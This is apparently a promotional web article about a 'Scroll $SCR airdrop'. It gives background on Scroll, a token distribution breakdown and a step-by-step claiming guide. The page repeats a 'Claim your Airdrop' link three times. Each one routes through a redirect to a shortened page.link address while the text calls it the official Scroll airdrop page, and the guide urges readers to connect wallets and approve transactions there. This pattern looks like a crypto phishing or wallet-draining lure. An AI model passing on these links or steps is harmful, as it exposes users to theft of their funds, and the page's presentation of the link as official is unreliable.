The Scroll $SCR airdrop is here, and it’s bigger than ever! Designed to reward active users of Ethereum Layer 2 (L2) networks and loyal participants in the Scroll ecosystem, the airdrop is now live. As part of this initiative, Scroll has expanded eligibility criteria to include Ethereum L2 active users, and in a bid to compensate for the downturn in the crypto market, Scroll has also recovered 20 million $SCR tokens from Sybil attackers, which are now available for claiming. If you’re eligible, this is your chance to get in on one of the largest airdrops in the space!

In this article, we’ll dive deep into what Scroll is, why $SCR tokens are crucial to the project, and provide a step-by-step guide to claiming your airdrop. **[Claim your Airdrop](/302.html?target=https://eoc.page.link/85EH#78891)**

What is Scroll?
Scroll is a zkEVM Rollup built on Ethereum, designed to enhance the network’s scalability without compromising on decentralization or security. As a Layer 2 scaling solution, Scroll bundles multiple transactions into a single proof using zk-rollups, which reduces gas fees and increases transaction throughput. This approach helps decentralized applications (dApps) run more efficiently, enabling mass adoption of blockchain technology.

With zk-rollups, Scroll ensures the high level of security Ethereum is known for, while greatly improving performance. As more dApps migrate to or are built on Ethereum, scalability solutions like Scroll are critical in making the blockchain more accessible and efficient.

Why the $SCR Airdrop Matters
The $SCR token plays a pivotal role in the Scroll ecosystem. It is used for governance, incentivizing contributors, and supporting the long-term sustainability of the network. The airdrop is designed to reward those who have engaged with the Scroll ecosystem or other Ethereum L2 networks and to distribute ownership of the network to a wider audience.

Here are a few reasons why the $SCR airdrop is significant:

Governance: $SCR holders will participate in Scroll’s decentralized governance through the Scroll DAO, where they can vote on key protocol updates and decisions.
Incentives for Provers and Sequencers: The $SCR token will be used to reward provers and sequencers, ensuring the network’s transaction security and efficiency over time.
Ecosystem Growth: The airdrop is part of Scroll’s broader plan to grow its ecosystem by rewarding active users and contributors who support the network.
With the crypto market experiencing a downturn, this airdrop comes at a critical time, offering additional value to users and building a more resilient community. The airdrop also compensates users with 20 million $SCR tokens reclaimed from Sybil attackers, making this event even more impactful.

$SCR Token Distribution
The total supply of $SCR tokens is 1,000,000,000. Here’s how the distribution breaks down:

Airdrops — 15%: 7% is allocated for the first airdrop, rewarding early and active participants. An additional 8% is reserved for future airdrops over the next 12–18 months.
Ecosystem & Growth — 35%: These tokens are set aside to promote the development of the Scroll ecosystem, supporting projects, developers, and contributors.
Scroll Foundation Treasury — 10%: Managed by the Scroll Foundation, these funds ensure long-term sustainability and development.
Core Contributors — 23%: The core team and advisors are allocated this portion for their role in building and supporting the Scroll network.
Investors — 17%: Early investors who helped fund the project receive a share of the total supply in return for their contributions.

Step-by-Step Guide to Claim Your Scroll Airdrop
If you think you’re eligible for the Scroll airdrop, follow this detailed guide to claim your $SCR tokens.

Step 1: Check Your Eligibility
The first step is to determine whether you’re eligible to participate in the airdrop. Eligibility is based on your on-chain activity in the Scroll ecosystem or interactions with Ethereum L2 solutions before the snapshot date of October 19, 2024.

**Visit the Scroll Official Airdrop Page.**
Connect your wallet (MetaMask or another supported wallet) to the platform.
The system will automatically verify whether your wallet address qualifies for the airdrop based on your interactions with Scroll or Ethereum L2 networks. **[Claim your Airdrop](/302.html?target=https://eoc.page.link/85EH#78891)**

Step 2: Prepare Your Wallet
Before you claim your tokens, ensure that your wallet is prepared:

ETH for Gas Fees: Ensure that you have enough ETH in your wallet to cover gas fees, as they are required to process the transaction on Ethereum.
Correct Wallet Address: Double-check that you are using the same wallet that interacted with Scroll or other L2 networks. Only this address will be eligible for the airdrop.
Step 3: Claim Your $SCR Tokens
Once your eligibility is confirmed and your wallet is prepared, follow these steps to claim your tokens:

On the Scroll Official Airdrop Page, click on the “Claim” button next to the amount of $SCR tokens allocated to your wallet.
A pop-up will appear from your wallet (e.g., MetaMask), asking for confirmation to process the transaction.
Review the gas fee and transaction details, then click “Approve” to confirm the transaction.
Your $SCR tokens will be transferred to your wallet once the transaction is confirmed. The process may take a few minutes as it is processed on the Ethereum network.

Step 4: Verify Your $SCR Tokens
After the transaction is complete, you’ll need to ensure that the tokens have been successfully added to your wallet:

Check Your Wallet Balance: Open your wallet and check whether the $SCR tokens are visible in your assets. If they don’t appear automatically, you may need to add them manually.
Manually Add $SCR: To manually add the $SCR token:
Go to your wallet settings and select “Add Token.”
Enter the $SCR contract address (available on the Scroll Official Airdrop Page), and confirm. **[Claim your Airdrop](/302.html?target=https://eoc.page.link/85EH#78891)**

Staking Opportunities: Stay updated on upcoming staking mechanisms, where you can earn rewards by staking your $SCR tokens.
Trading and Holding: Once listed on exchanges, you can trade your $SCR tokens or hold them as part of your long-term investment in the Scroll ecosystem.
